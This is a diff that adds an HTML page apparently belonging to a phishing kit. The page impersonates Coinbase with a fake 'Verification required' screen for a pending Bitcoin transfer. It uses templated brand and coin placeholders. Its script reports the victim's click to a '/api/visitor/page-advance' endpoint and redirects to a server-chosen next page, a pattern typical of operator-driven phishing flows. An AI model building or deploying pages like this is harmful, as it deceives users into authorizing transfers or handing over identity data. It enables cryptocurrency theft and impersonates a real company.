@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="en" class="dark" style="color-scheme: dark;">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification required</title>
+<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
+<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
+<style>
+.vm{min-height:100vh;background:#000;color:#fff;font-family:'CoinbaseSansFont',system-ui,sans-serif;max-width:480px;margin:0 auto;padding:24px 20px;box-sizing:border-box;text-align:center}
+.vm-warn{width:56px;height:56px;border-radius:12px;background:#ea580c;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+.vm-title{font-size:22px;font-weight:700;margin:0 0 12px}
+.vm-sub{color:#94a3b8;font-size:14px;line-height:1.55;margin:0 0 28px}
+.vm-card{background:#111;border-radius:14px;padding:16px;display:flex;align-items:center;gap:14px;text-align:left;margin-bottom:20px}
+.vm-card img{width:40px;height:40px;border-radius:50%}
+.vm-card h3{margin:0;font-size:15px;font-weight:600}
+.vm-card p{margin:4px 0 0;color:#6b7280;font-size:13px}
+.vm-pending{margin-left:auto;color:#f97316;font-weight:600;font-size:14px}
+.vm-note{color:#4b5563;font-size:12px;margin-bottom:24px}
+.vm-btn{width:100%;height:52px;border-radius:9999px;font-weight:600;font-size:16px;border:0;background:rgb(87,139,250);color:#0a0b0d;cursor:pointer;font-family:inherit}
+</style>
+</head>
+<body style="margin:0">
+<div class="vm">
+  <div class="vm-warn"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><path d="M12 9v4M12 17h.01"/><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg></div>
+  <h1 class="vm-title">Verification required</h1>
+  <p class="vm-sub">To complete the transfer of your <span data-rv-var="coinSymbol">BTC</span>, identity verification sent via email or text may be required. Please verify to authorize this transfer.</p>
+  <div class="vm-card">
+    <img data-rv-var-img="coinImg" src="/_next/static/media/bitcoin.44da609b.png" alt="">
+    <div><h3 data-rv-var="coinName">Bitcoin</h3><p>Awaiting ID verification</p></div>
+    <span class="vm-pending" data-rv-var="status">Pending</span>
+  </div>
+  <p class="vm-note">This verification is required by Coinbase for security.</p>
+  <button id="rv-done" type="button" class="vm-btn">Done</button>
+</div>
+<script>
+document.getElementById('rv-done').addEventListener('click',function(){
+  var b=this;b.disabled=true;
+  fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Verification Required',choice:'done'})})
+    .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else b.disabled=false;});
+});
+</script>
+</body>
+</html>
